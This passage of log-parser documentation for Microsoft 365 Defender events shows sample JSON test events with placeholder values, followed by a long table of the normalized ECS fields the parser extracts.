                "InitiatingProcessVersionInfoOriginalFileName": "mmc.exe",
                "InitiatingProcessVersionInfoProductName": "Microsoft\u00ae Windows\u00ae Operating System",
                "InitiatingProcessVersionInfoProductVersion": "10.0.20348.3804",
                "IsInitiatingProcessRemoteSession": "true"
            },
            "type": "ScreenshotTaken"
        },
        "agent": {
            "id": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc"
        },
        "host": {
            "id": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc",
            "name": "example.com"
        },
        "microsoft": {
            "defender": {
                "report": {
                    "id": "545956"
                }
            }
        },
        "process": {
            "args": [
                "C:\\Windows\\system32\\dnsmgmt.msc"
            ],
            "command_line": "\"mmc.exe\" C:\\Windows\\system32\\dnsmgmt.msc",
            "executable": "c:\\windows\\system32\\mmc.exe",
            "hash": {
                "md5": "68b329da9893e34099c7d8ad5cb9c940",
                "sha1": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc",
                "sha256": "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b"
            },
            "name": "mmc.exe",
            "parent": {
                "name": "svchost.exe",
                "pid": 8568,
                "start": "2025-07-10T08:08:33.994845Z"
            },
            "pid": 11948,
            "start": "2025-07-11T08:52:42.149923Z",
            "user": {
                "domain": "example.com",
                "email": "j.doe@acme-internal.net",
                "id": "user1",
                "name": "j.doe"
            },
            "working_directory": "c:\\windows\\system32"
        },
        "related": {
            "hash": [
                "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b",
                "68b329da9893e34099c7d8ad5cb9c940",
                "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc"
            ],
            "hosts": [
                "example.com"
            ],
            "ip": [
                "1.1.1.1"
            ]
        },
        "source": {
            "address": "example.com",
            "domain": "example.com",
            "ip": "1.1.1.1",
            "registered_domain": "example.com",
            "top_level_domain": "com"
        }
    }
    	
	```


=== "test_url_click_events.json"

    ```json
	
    {
        "message": "{\"time\":\"2024-10-03T11:23:25.9069421Z\",\"tenantId\":\"22222222-2222-2222-2222-222222222222\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-UrlClickEvents\",\"_TimeReceivedBySvc\":\"2024-10-03T11:23:00.0292845Z\",\"properties\":{\"ReportId\":\"33333333-3333-3333-3333-333333333333\",\"Url\":\"https://example.com/index.php?q=some+stuff\",\"NetworkMessageId\":\"11111111-1111-1111-1111-111111111111\",\"Timestamp\":\"2024-10-03T11:22:59Z\",\"AccountUpn\":\"john.doe@example.com\",\"UrlChain\":\"[\\\"https://example.com/index.php?q=some+stuff\\\",\\\"https://example.com/index.php?q=some+stuff&p=2\\\"]\",\"ActionType\":\"ClickAllowed\",\"ThreatTypes\":null,\"DetectionMethods\":null,\"Workload\":\"Email\",\"IPAddress\":\"1.1.1.1\",\"IsClickedThrough\":false},\"Tenant\":\"DefaultTenant\"}",
        "event": {
            "category": [
                "web"
            ],
            "dataset": "url_click_events",
            "type": [
                "info"
            ]
        },
        "@timestamp": "2024-10-03T11:22:59Z",
        "action": {
            "name": "Publish",
            "properties": {
                "AccountUPN": "john.doe@example.com"
            },
            "type": "ClickAllowed"
        },
        "email": {
            "local_id": "11111111-1111-1111-1111-111111111111"
        },
        "microsoft": {
            "defender": {
                "report": {
                    "id": "33333333-3333-3333-3333-333333333333"
                }
            }
        },
        "related": {
            "ip": [
                "1.1.1.1"
            ]
        },
        "source": {
            "address": "1.1.1.1",
            "ip": "1.1.1.1"
        },
        "url": {
            "domain": "example.com",
            "full": "https://example.com/index.php?q=some+stuff",
            "original": "https://example.com/index.php?q=some+stuff",
            "path": "/index.php",
            "port": 443,
            "query": "q=some+stuff",
            "registered_domain": "example.com",
            "scheme": "https",
            "top_level_domain": "com"
        }
    }
    	
	```





### Extracted Fields

The following table lists the fields that are extracted, normalized under the ECS format, analyzed and indexed by the parser. It should be noted that infered fields are not listed.

| Name | Type | Description                |
| ---- | ---- | ---------------------------|
|`@timestamp` | `date` | Date/time when the event originated. |
|`action.properties.AadDeviceId` | `keyword` | Unique identifier for the device in Azure AD |
|`action.properties.AccountApplicationId` | `keyword` | The application ID associated with the storage access |
|`action.properties.AccountObjectId` | `keyword` | The unique identifier of the object is making the storage access |
|`action.properties.AccountSid` | `keyword` | Security Identifier (SID) of the account |
|`action.properties.AccountTenantId` | `keyword` | The unique identifier of the Azure tenant |
|`action.properties.AccountType` | `number` | The account type used |
|`action.properties.AccountUPN` | `keyword` | User principal name (UPN) of the account |
|`action.properties.ActionResult` | `keyword` | Result of the action |
|`action.properties.ActionTrigger` | `keyword` | Indicates whether an action was triggered by an administrator (manually or through approval of a pending automated action), or by some special mechanism, such as a ZAP or Dynamic Delivery |
|`action.properties.ActionType` | `keyword` | Type of activity that triggered the event: Manual remediation, Phish ZAP, Malware ZAP |
|`action.properties.AnonymousSuccessfulOperations` | `long` | The count of successful anonymous operations |
|`action.properties.Application` | `keyword` | Application that performed the recorded action |
|`action.properties.ApplicationId` | `keyword` | Unique identifier for the application |
|`action.properties.AttachmentCount` | `number` | Number of attachments in the email |
|`action.properties.AuthenticationDetails` | `keyword` | List of pass or fail verdicts by email authentication protocols like DMARC, DKIM, SPF or a combination of multiple authentication types (CompAuth) |
|`action.properties.AuthenticationType` | `keyword` | The authentication method used to access the storage (for example, AccountKey, SAS, Oauth) |
|`action.properties.AwsResourceName` | `keyword` | Unique identifier specific to Amazon Web Services devices, containing the Amazon resource name |
|`action.properties.AzureResourceId` | `keyword` | Unique identifier of the Azure resource associated with the process |
|`action.properties.ClientCloudPlatformName` | `keyword` | The name of the cloud platform where the data center is located |
|`action.properties.ClientSystemServiceName` | `keyword` | The name of the system service is in the data center |
|`action.properties.ConfidenceLevel` | `keyword` | List of confidence levels of any spam or phishing verdicts. For spam, this column shows the spam confidence level (SCL), indicating if the email was skipped (-1), found to be not spam (0,1), found to be spam with moderate confidence (5,6), or found to be spam with high confidence (9). For phishing, this column displays whether the confidence level is "High" or "Low". |
|`action.properties.Connectors` | `keyword` | Custom instructions that define organizational mail flow and how the email was routed |
|`action.properties.ContainerId` | `keyword` | The container identifier in Kubernetes or another runtime environment |
|`action.properties.ContainerImageName` | `keyword` | The container image name or ID, if it exists |
|`action.properties.ContainerName` | `keyword` | Name of the container in Kubernetes or another runtime environment |
|`action.properties.DataSource` | `keyword` | Data source for the cloud audit events, can be GCP (for Google Cloud Platform), AWS (for Amazon Web Services), Azure (for Azure Resource Manager), Kubernetes Audit (for Kubernetes), or other cloud platforms |
|`action.properties.DeliveryAction` | `keyword` | Delivery action of the email: Delivered, Junked, Blocked, or Replaced |
|`action.properties.DeliveryLocation` | `keyword` | Location where the email was delivered: Inbox/Folder, On-premises/External, Junk, Quarantine, Failed, Dropped, Deleted items |
|`action.properties.DestinationDeviceName` | `keyword` | Name of the device running the server application that processed the recorded action |
|`action.properties.DeviceSerialNumber` | `keyword` | Serial number of the device |
|`action.properties.DistinctGetOperations` | `long` | The count of distinct GET operations performed |
|`action.properties.EmailAction` | `keyword` | Final action taken on the email based on filter verdict, policies, and user actions: Move message to junk mail folder, Add X-header, Modify subject, Redirect message, Delete message, send to quarantine, No action taken, Bcc message |
|`action.properties.EmailClusterId` | `keyword` | Identifier for the group of similar emails clustered based on heuristic analysis of their contents |
|`action.properties.EmailDirection` | `keyword` | Direction of the email relative to your network: Inbound, Outbound, Intra-org |
|`action.properties.EmailLanguage` | `keyword` | Detected language of the email content |
|`action.properties.FailedOperationsCount` | `long` | The count of failed storage operations |
|`action.properties.FileOriginIP` | `keyword` | IP address where the file was downloaded from |
|`action.properties.FileOriginReferrerUrl` | `keyword` | URL of the web page that links to the downloaded file |
|`action.properties.FileOriginUrl` | `keyword` | URL where the file was downloaded from |
|`action.properties.GcpFullResourceName` | `keyword` | Unique identifier specific to Google Cloud Platform devices, containing a combination of zone and ID for GCP |
|`action.properties.GroupId` | `keyword` | Identifier for the team or group that the message was sent to |
|`action.properties.GroupName` | `keyword` | Name of the team or group that the message was sent to |
|`action.properties.HasAnonymousResourceNotFoundFailures` | `boolean` | Indicates whether anonymous resource not found failures occurred |
|`action.properties.HashReputationMd5List` | `array` | A list of MD5 hash reputations for the accessed resources |
|`action.properties.IPCategory` | `keyword` | Additional information about the IP address |
|`action.properties.IPTags` | `list` | Customer-defined information applied to specific IP addresses and IP address ranges |
|`action.properties.ISP` | `keyword` | Internet service provider associated with the IP address |
|`action.properties.InitiatingProcessAccountObjectId` | `keyword` | Azure AD object ID of the user account that ran the process responsible for the event |
|`action.properties.InitiatingProcessCommandLine` | `keyword` | Process commande Line that initiated the event |
|`action.properties.InitiatingProcessFileSize` | `long` | Size of the process (image file) that initiated the event |
|`action.properties.InitiatingProcessIntegrityLevel` | `keyword` | Integrity level of the process that initiated the event. Windows assigns integrity levels to processes based on certain characteristics, such as if they were launched from an internet download. These integrity levels influence permissions to resources |
|`action.properties.InitiatingProcessLogonId` | `keyword` | Identifier for a logon session of the process that initiated the event. This identifier is unique on the same machine only between restarts. |
|`action.properties.InitiatingProcessParentFileName` | `keyword` | Initiating parent process file name |
|`action.properties.InitiatingProcessSessionId` | `keyword` | Windows session ID of the initiating process |
|`action.properties.InitiatingProcessTokenElevation` | `keyword` | Token type indicating the presence or absence of User Access Control (UAC) privilege elevation applied to the process that initiated the event |
|`action.properties.InitiatingProcessVersionInfoCompanyName` | `keyword` | Company name from the version information of the process (image file) responsible for the event |
|`action.properties.InitiatingProcessVersionInfoFileDescription` | `keyword` | Description from the version information of the process (image file) responsible for the event |
|`action.properties.InitiatingProcessVersionInfoInternalFileName` | `keyword` | Internal file name from the version information of the process (image file) responsible for the event |
|`action.properties.InitiatingProcessVersionInfoOriginalFileName` | `keyword` | Original file name from the version information of the process (image file) responsible for the event |
|`action.properties.InitiatingProcessVersionInfoProductName` | `keyword` | Product name from the version information of the process (image file) responsible for the event |
|`action.properties.InitiatingProcessVersionInfoProductVersion` | `keyword` | Product version from the version information of the process (image file) responsible for the event |
|`action.properties.IsAdminOperation` | `keyword` | Indicates whether the activity was performed by an administrator |
|`action.properties.IsAnonymousProxy` | `keyword` | Indicates whether the IP address belongs to a known anonymous proxy |
|`action.properties.IsAzureADJoined` | `boolean` | Boolean indicator of whether machine is joined to the Azure Active Directory |
|`action.properties.IsAzureInfoProtectionApplied` | `boolean` | Indicates whether the file is encrypted by Azure Information Protection |
|`action.properties.IsExternalThread` | `boolean` | Indicates if there are external recipients in the thread (1) or none (0) |
|`action.properties.IsExternalUser` | `boolean` | Indicates whether a user inside the network doesn't belong to the organization's domain |
|`action.properties.IsImpersonated` | `boolean` | Indicates whether the activity was performed by one user for another (impersonated) user |
|`action.properties.IsInitiatingProcessRemoteSession` | `keyword` | Indicates whether the initiating process was run under a remote desktop protocol (RDP) session (true) or locally (false) |
|`action.properties.IsKnownSuspiciousIp` | `boolean` | Indicates whether the IP address is known to be suspicious |
|`action.properties.IsLocalAdmin` | `boolean` | Boolean indicator of whether the user is a local administrator on the machine |
|`action.properties.IsOwnedThread` | `boolean` | Boolean value indicating whether the message is owned by your organization or not (only the messages owned by your organization can be remediated) |
|`action.properties.IsPrivateIp` | `boolean` | Indicates whether the IP address is private |
|`action.properties.IsTorExitNode` | `boolean` | Indicates whether the IP address is a Tor exit node |
|`action.properties.JoinType` | `keyword` | The nature of the joint |
|`action.properties.KubernetesNamespace` | `keyword` | The Kubernetes namespace name |
|`action.properties.KubernetesPodName` | `keyword` | The Kubernetes pod name |
|`action.properties.KubernetesResource` | `keyword` | Identifier value that includes namespace, resource type and name |
|`action.properties.LatestDeliveryLocation` | `keyword` | Last known location of the message |
|`action.properties.LocalIPType` | `keyword` | Type of IP address, for example Public, Private, Reserved, Loopback, Teredo, FourToSixMapping, and Broadcast |
|`action.properties.Location` | `keyword` | City, country, or other geographic location associated with the event |
|`action.properties.LoggedOnUsers` | `keyword` | List of all users that are logged on the machine at the time of the event in JSON array format |
|`action.properties.LogonId` | `keyword` | Identifier for a logon session. This identifier is unique on the same machine only between restarts |
|`action.properties.LogonType` | `keyword` | Type of logon session, specifically: |
|`action.properties.MachineGroup` | `keyword` | Machine group of the machine. This group is used by role-based access control to determine access to the machine |
|`action.properties.MergedDeviceIds` | `keyword` | Previous device IDs that have been assigned to the same device |
|`action.properties.MergedToDeviceId` | `keyword` | The most recent device ID assigned to a device |
|`action.properties.MessageId` | `keyword` | Identifier for the message (non-unique) |
|`action.properties.ObjectId` | `keyword` | Unique identifier of the object that the recorded action was applied to |
|`action.properties.ObjectName` | `keyword` | Name of the object that the recorded action was applied to |
|`action.properties.ObjectType` | `keyword` | Type of object, such as a file or a folder, that the recorded action was applied to |
|`action.properties.OnboardingStatus` | `keyword` | Indicates whether the device is currently onboarded or not to Microsoft Defender for Endpoint or if the device is not supported |
|`action.properties.OperationNamesList` | `keyword` | A list of storage operations performed (for example, CreateContainer, DeleteContainer) |
|`action.properties.OperationsCount` | `long` | The total number of storage operations performed |
|`action.properties.OrgLevelAction` | `keyword` | Action taken on the email in response to matches to a policy defined at the organizational level |
|`action.properties.OrgLevelPolicy` | `keyword` | Organizational policy that triggered the action taken on the email |
|`action.properties.ParentMessageId` | `keyword` | Identifier for the message that the current message was a reply to, otherwise this is the same as the MessageId |
|`action.properties.PreviousFileName` | `keyword` | Original name of the file that was renamed as a result of the action |
|`action.properties.PreviousFolderPath` | `keyword` | Original folder containing the file before the recorded action was applied |
|`action.properties.PreviousRegistryKey` | `keyword` | Original registry key of the registry value before it was modified |
|`action.properties.PreviousRegistryValueData` | `keyword` | Original data of the registry value before it was modified |
|`action.properties.PreviousRegistryValueName` | `keyword` | Original name of the registry value before it was modified |
|`action.properties.ProcessIntegrityLevel` | `keyword` | Integrity level of the newly created process. Windows assigns integrity levels to processes based on certain characteristics, such as if they were launched from an internet downloaded. These integrity levels influence permissions to resources |
|`action.properties.ProcessTokenElevation` | `keyword` | Token type indicating the presence or absence of User Access Control (UAC) privilege elevation applied to the newly created process |
|`action.properties.ProcessVersionInfoCompanyName` | `keyword` | Company name from the version information of the newly created process |
|`action.properties.ProcessVersionInfoFileDescription` | `keyword` | Description from the version information of the newly created process |
|`action.properties.ProcessVersionInfoInternalFileName` | `keyword` | Internal file name from the version information of the newly created process |
|`action.properties.ProcessVersionInfoOriginalFileName` | `keyword` | Original file name from the version information of the newly created process |
|`action.properties.ProcessVersionInfoProductName` | `keyword` | Product name from the version information of the newly created process |
|`action.properties.ProcessVersionInfoProductVersion` | `keyword` | Product version from the version information of the newly created process |
|`action.properties.Query` | `keyword` | String used to run the query |
|`action.properties.QueryTarget` | `keyword` | Name of user, group, device, domain, or any other entity type being queried |
|`action.properties.QueryType` | `keyword` | Type of query, such as QueryGroup, QueryUser, or EnumerateUsers |
|`action.properties.RawEventData` | `keyword` | Raw event information from the source application or service in JSON format |
|`action.properties.RecipientDetails` | `array` | Array of recipient data |
|`action.properties.RecipientObjectId` | `keyword` | Unique identifier for the email recipient in Azure AD |
|`action.properties.RegistryDeviceTag` | `keyword` | Machine tag added through the registry |
|`action.properties.RemoteDeviceName` | `keyword` | Name of the machine that performed a remote operation on the affected machine. Depending on the event being reported, this name could be a fully-qualified domain name (FQDN), a NetBIOS name, or a host name without domain information |
|`action.properties.RemoteIPType` | `keyword` | Type of IP address, for example Public, Private, Reserved, Loopback, Teredo, FourToSixMapping, and Broadcast |
|`action.properties.RequestAccountSid` | `keyword` | Security Identifier (SID) of the account used to remotely initiate the activity |
|`action.properties.ResourceGroup` | `keyword` | Name of the resource group where the storage account resides |
|`action.properties.SenderDisplayName` | `keyword` | Name of the sender displayed in the address book, typically a combination of a given or first name, a middle initial, and a last name or surname |
|`action.properties.SenderEmailAddress` | `keyword` | Email address of the sender |
|`action.properties.SenderFromDomain` | `keyword` | Sender domain in the FROM header, which is visible to email recipients on their email clients |
|`action.properties.SenderObjectId` | `keyword` | Unique identifier for the sender's account in Azure AD |
|`action.properties.SenderType` | `keyword` | Type of user that sent the message, for example, User, Group, Anonymous |
|`action.properties.SensitivityLabel` | `keyword` | Label applied to an email, file, or other content to classify it for information protection |
|`action.properties.SensitivitySubLabel` | `keyword` | Sublabel applied to an email, file, or other content to classify it for information protection; sensitivity sublabels are grouped under sensitivity labels but are treated independently |
|`action.properties.ServiceSource` | `keyword` | Product or service that provided the alert information |
|`action.properties.ServiceType` | `keyword` | Specifies the type of storage service (for example, Blob, ADLS Gen2, Files.REST, Files.SMB) |
|`action.properties.ShareName` | `keyword` | Name of shared folder containing the file |
|`action.properties.SourceComputerId` | `keyword` |  |
|`action.properties.SourceComputerObjectGuid` | `keyword` |  |
|`action.properties.StorageAccount` | `keyword` | The identifier for the storage account |
|`action.properties.StorageContainer` | `keyword` | The identifier for the storage container |
|`action.properties.StorageFileShare` | `keyword` | The identifier for the storage file share |
|`action.properties.SubscriptionId` | `keyword` | Unique identifier assigned to the Azure subscription |
|`action.properties.SuccessfulOperationsCount` | `long` | The count of successful storage operations |
|`action.properties.SuccessfulReadOperations` | `long` | The count of successful read operations |
|`action.properties.SuspiciousUserAgentName` | `keyword` | The name of the suspicious user agent accessing the storage |
|`action.properties.TargetAccountDisplayName` | `keyword` | Display name of the account that the recorded action was applied to |
|`action.properties.TargetAccountUpn` | `keyword` | User principal name (UPN) of the account that the recorded action was applied to |
|`action.properties.TargetDeviceName` | `keyword` | Fully qualified domain name (FQDN) of the device that the recorded action was applied to |
|`action.properties.TeamsMessageId` | `keyword` | Unique identifier for the message, as generated by Microsoft 365 |
|`action.properties.ThreadId` | `keyword` | Identifier of the channel or chat thread that the message is part of |
|`action.properties.ThreadSubtype` | `keyword` | Indicates the channel type |
|`action.properties.ThreatTypes` | `keyword` | Verdict from the filtering stack on whether the message contains malware, phishing, or other threats |
|`action.properties.UrlCount` | `number` | Number of embedded URLs in the email |
|`action.properties.UserAgentHeader` | `keyword` | Details of the user agent accessing the storage (for example, browser or application) |
|`action.properties.UserAgentTags` | `list` | More information provided by Microsoft Defender for Cloud Apps in a tag in the user agent field. Can have any of the following values: Native client, Outdated browser, Outdated operating system, Robot |
|`action.properties.UserLevelAction` | `keyword` | Action taken on the email in response to matches to a mailbox policy defined by the recipient |
|`action.properties.UserLevelPolicy` | `keyword` | End-user mailbox policy that triggered the action taken on the email |
|`agent.id` | `keyword` | Unique identifier of this agent. |
|`agent.version` | `keyword` | Version of the agent. |
|`client.geo.city_name` | `keyword` | City name. |
|`client.geo.country_name` | `keyword` | Country name. |
|`client.geo.region_name` | `keyword` | Region name. |
|`cloud.account.id` | `keyword` | The cloud account or organization id. |
|`container.id` | `keyword` | Unique container id. |
|`container.runtime` | `keyword` | Runtime managing this container. |
|`destination.ip` | `ip` | IP address of the destination. |
|`destination.mac` | `keyword` | MAC address of the destination. |
|`destination.port` | `long` | Port of the destination. |
|`email.attachments` | `nested` | List of objects describing the attachments. |
|`email.from.address` | `keyword` | The email address of the sender, typically from the RFC 5322 From: header field |
|`email.local_id` | `keyword` | Unique identifier given to the email by the source that created the event |
|`email.message_id` | `keyword` | Identifier from the RFC 5322 Message-ID: email header that refers to a particular email message |
|`email.sender.address` | `keyword` | Address of the message sender. |
|`email.subject` | `keyword` | A brief summary of the topic of the message |
|`email.to.address` | `keyword` | The email address of recipient |
|`event.action` | `keyword` | The action captured by the event. |
|`event.category` | `keyword` | Event category. The second categorization field in the hierarchy. |
|`event.dataset` | `keyword` | Name of the dataset. |
|`event.kind` | `keyword` | The kind of the event. The highest categorization field in the hierarchy. |
|`event.outcome` | `keyword` | The outcome of the event. The lowest level categorization field in the hierarchy. |
|`event.type` | `keyword` | Event type. The third categorization field in the hierarchy. |
|`file.directory` | `keyword` | Directory where the file is located. |
|`file.hash.md5` | `keyword` | MD5 hash. |
|`file.hash.sha1` | `keyword` | SHA1 hash. |
|`file.hash.sha256` | `keyword` | SHA256 hash. |
|`file.name` | `keyword` | Name of the file including the extension, without the directory. |
|`file.size` | `long` | File size in bytes. |
|`file.x509.not_after` | `date` | Time at which the certificate is no longer considered valid. |
|`file.x509.serial_number` | `keyword` | Unique serial number issued by the certificate authority. |
|`host.architecture` | `keyword` | Operating system architecture. |
|`host.id` | `keyword` | Unique host id. |
|`host.mac` | `keyword` | Host MAC addresses. |
|`host.name` | `keyword` | Name of the host. |
|`host.os.family` | `keyword` | OS family (such as redhat, debian, freebsd, windows). |
|`host.os.full` | `keyword` | Operating system name, including the version or code name. |
|`host.os.type` | `keyword` | Which commercial OS family (one of: linux, macos, unix or windows). |
|`host.os.version` | `keyword` | Operating system version as a raw string. |
|`host.type` | `keyword` | Type of host. |
|`microsoft.defender.activity.objects` | `list` | List of objects, such as files or folders, that were involved in the recorded activity |
|`microsoft.defender.activity.type` | `keyword` | Type of activity that triggered the event |
|`microsoft.defender.alert.id` | `keyword` | Unique identifier for the alert |
|`microsoft.defender.alert.severity` | `keyword` | The severity of the alert |
|`microsoft.defender.alert.title` | `keyword` | The title of the alert |
|`microsoft.defender.certificate.counter_signed_at` | `keyword` | Date and time the certificate was countersigned |
|`microsoft.defender.certificate.created_at` | `keyword` | Date and time the certificate was created |
|`microsoft.defender.certificate.crl.urls` | `keyword` | JSON array listing the URLs of network shares that contain certificates and certificate revocation lists (CRLs) |
|`microsoft.defender.certificate.is_root_signer_microsort` | `boolean` | Indicates whether the signer of the root certificate is Microsoft and if the file is included in Windows operating system |
|`microsoft.defender.certificate.is_signed` | `boolean` | Indicates whether the file is signed |
|`microsoft.defender.certificate.is_trusted` | `boolean` | Indicates whether the file is trusted based on the results of the WinVerifyTrust function, which checks for unknown root certificate information, invalid signatures, revoked certificates, and other questionable attributes |
|`microsoft.defender.certificate.issuer.hash` | `keyword` | Unique hash value identifying issuing certificate authority (CA) |
|`microsoft.defender.certificate.issuer.name` | `keyword` | Information about the issuing certificate authority (CA) |
|`microsoft.defender.certificate.signature_type` | `keyword` | Indicates whether signature information was read as embedded content in the file itself or read from an external catalog file |
|`microsoft.defender.certificate.signer.hash` | `keyword` | Unique hash value identifying the signer |
|`microsoft.defender.certificate.signer.name` | `keyword` | Information about the signer of the file |
|`microsoft.defender.email_auth.CompAuth` | `keyword` | The result of combination of multiple authentication types |
|`microsoft.defender.email_auth.DKIM` | `keyword` | The result of the DomainKeys Identified Mail (DKIM) |
|`microsoft.defender.email_auth.DMARC` | `keyword` | The result of the Domain-based Message Authentication Reporting and Conformance (DMARC) |
|`microsoft.defender.email_auth.SPF` | `keyword` | The result of the Sender Policy Framework (SPF) |
|`microsoft.defender.entity.type` | `keyword` | Type of object, such as a file, a process, a device, or a user |
|`microsoft.defender.evidence.direction` | `keyword` | Indicates whether the entity is the source or the destination of a network connection |
|`microsoft.defender.evidence.role` | `keyword` | How the entity is involved in an alert, indicating whether it is impacted or is merely related |
|`microsoft.defender.host.category` | `keyword` | Broader classification that groups certain device types under the following categories: Endpoint, Network device, IoT, Unknown |
|`microsoft.defender.host.model` | `keyword` | Model name or number of the product from the vendor or manufacturer, only available if device discovery finds enough information about this attribute |
|`microsoft.defender.host.os.build` | `keyword` | Build version of the operating system running on the machine |
|`microsoft.defender.host.os.version` | `keyword` | Additional information about the OS version, such as the popular name, code name, or version number |
|`microsoft.defender.host.subtype` | `keyword` | Additional modifier for certain types of devices, for example, a mobile device can be a tablet or a smartphone; only available if device discovery finds enough information about this attribute |
|`microsoft.defender.host.vendor` | `keyword` | Name of the product vendor or manufacturer, only available if device discovery finds enough information about this attribute |
|`microsoft.defender.investigation.id` | `keyword` | Investigation id |
|`microsoft.defender.investigation.name` | `keyword` | Investigation name |
|`microsoft.defender.investigation.status` | `keyword` | Investigation status |
|`microsoft.defender.investigation.type` | `keyword` | Investigation type |
|`microsoft.defender.network.tunnel.protocol` | `keyword` | Tunneling protocol, if the interface is used for this purpose, for example 6to4, Teredo, ISATAP, PPTP, SSTP, and SSH |
|`microsoft.defender.observer.interface.dhcp.ipv4` | `keyword` | IPv4 address of DHCP server |
|`microsoft.defender.observer.interface.dhcp.ipv6` | `keyword` | IPv6 address of DHCP server |
|`microsoft.defender.observer.interface.dns` | `keyword` | DNS server addresses in JSON array format |
|`microsoft.defender.observer.interface.gateways` | `keyword` | Default gateway addresses in JSON array format |
|`microsoft.defender.observer.interface.ips` | `keyword` | JSON array containing all the IP addresses assigned to the adapter, along with their respective subnet prefix and IP address space, such as public, private, or link-local |
|`microsoft.defender.observer.interface.name` | `keyword` | Name of the network adapter |
|`microsoft.defender.observer.interface.networks` | `keyword` | Networks that the adapter is connected to. Each JSON array contains the network name, category (public, private or domain), a description, and a flag indicating if it's connected publicly to the internet |
|`microsoft.defender.observer.interface.status` | `keyword` | Operational status of the network adapter. For the possible values, refer to this enumeration |
|`microsoft.defender.observer.interface.type` | `keyword` | Network adapter type. For the possible values, refer to this enumeration |
|`microsoft.defender.operation.properties` | `object` | Additional properties of the operation |
|`microsoft.defender.report.id` | `keyword` | Unique identifier for the event |
|`microsoft.defender.threat.category` | `keyword` | Type of threat indicator or breach activity identified by the alert |
|`microsoft.defender.threat.detection` | `keyword` | Methods used to detect malware, phishing, or other threats found in the email |
|`microsoft.defender.threat.detection_status` | `keyword` | The status of the detection |
|`microsoft.defender.threat.family` | `keyword` | Malware family that the suspicious or malicious file or process has been classified under |
|`microsoft.defender.threat.host.last_remediation_state` | `keyword` |  |
|`microsoft.defender.threat.host.remediation_providers` | `array` |  |
|`microsoft.defender.threat.last_remediation_state` | `keyword` |  |
|`microsoft.defender.threat.names` | `keyword` | Detection name for malware or other threats found |
|`microsoft.defender.threat.remediation_providers` | `array` |  |
|`microsoft.defender.threat.severity` | `keyword` | Indicates the potential impact (high, medium, or low) of the threat indicator or breach activity identified by the alert |
|`microsoft.defender.threat.suspicion_level` | `keyword` | The status of the detection |
|`microsoft.defender.threat.types` | `keyword` | Verdict from the email filtering stack on whether the email contains malware, phishing, or other threats |
|`microsoft.defender.threat.urls` | `keyword` | URLs |
|`microsoft.defender.url_location` | `keyword` | Indicates which part of the email the URL is located |
|`network.protocol` | `keyword` | Application protocol name. |
|`process.args` | `keyword` | Array of process arguments. |
|`process.command_line` | `wildcard` | Full command line that started the process. |
|`process.executable` | `keyword` | Absolute path to the process executable. |
|`process.hash.md5` | `keyword` | MD5 hash. |
|`process.hash.sha1` | `keyword` | SHA1 hash. |
|`process.hash.sha256` | `keyword` | SHA256 hash. |
|`process.name` | `keyword` | Process name. |
|`process.parent.args` | `keyword` | Array of process arguments. |
|`process.parent.code_signature.status` | `keyword` | Additional information about the certificate status. |
|`process.parent.code_signature.subject_name` | `keyword` | Subject name of the code signer |
|`process.parent.command_line` | `wildcard` | Full command line that started the process. |
|`process.parent.executable` | `keyword` | Absolute path to the process executable. |
|`process.parent.hash.md5` | `keyword` | MD5 hash. |
|`process.parent.hash.sha1` | `keyword` | SHA1 hash. |
|`process.parent.hash.sha256` | `keyword` | SHA256 hash. |
|`process.parent.name` | `keyword` | Process name. |
|`process.parent.pid` | `long` | Process id. |
|`process.parent.start` | `date` | The time the process started. |
|`process.parent.user.domain` | `keyword` |  |
|`process.parent.user.email` | `keyword` |  |
|`process.parent.working_directory` | `keyword` | The working directory of the process. |
|`process.pid` | `long` | Process id. |
|`process.start` | `date` | The time the process started. |
|`process.user.domain` | `keyword` | Domain of the account that ran the process responsible for the event |
|`process.user.email` | `keyword` | User principal name (UPN) of the account that ran the process responsible for the event |
|`process.user.id` | `keyword` | Security Identifier (SID) of the account that ran the process responsible for the event |
|`process.user.name` | `keyword` | User name of the account that ran the process responsible for the event |
|`process.working_directory` | `keyword` | The working directory of the process. |
|`registry.data.strings` | `wildcard` | List of strings representing what was written to the registry. |
|`registry.data.type` | `keyword` | Standard registry type for encoding contents |
|`registry.key` | `keyword` | Hive-relative path of keys. |
|`registry.value` | `keyword` | Name of the value written. |
|`rule.id` | `keyword` | Rule ID |
|`rule.name` | `keyword` | Rule name |
|`service.name` | `keyword` | Name of the service. |
|`service.type` | `keyword` | The type of the service. |
|`source.domain` | `keyword` | The domain name of the source. |
|`source.geo.city_name` | `keyword` | City name. |
|`source.ip` | `ip` | IP address of the source. |
|`source.mac` | `keyword` | MAC address of the source. |
|`source.port` | `long` | Port of the source. |
|`threat.technique.name` | `keyword` | Threat technique name. |
|`url.domain` | `keyword` | Domain of the url. |
|`url.original` | `wildcard` | Unmodified original url as seen in the event source. |
|`user.domain` | `keyword` | Name of the directory the user is a member of. |
|`user.full_name` | `keyword` | User's full name, if available. |
|`user.id` | `keyword` | Unique identifier of the user. |
|`user.name` | `keyword` | Short name or login of the user. |
|`user.roles` | `keyword` | Array of user roles at the time of the event. |
|`user_agent.original` | `keyword` | Unparsed user_agent string. |
|`volume.bus_type` | `keyword` | Bus type of the volume |
|`volume.dos_name` | `keyword` | DOS name of the volume |
|`volume.product_name` | `keyword` | Product name of the volume |



For more information on the Intake Format, please find the code of the Parser, Smart Descriptions, and Supported Events [here](https://github.com/SEKOIA-IO/intake-formats/tree/main/Microsoft/microsoft-365-defender).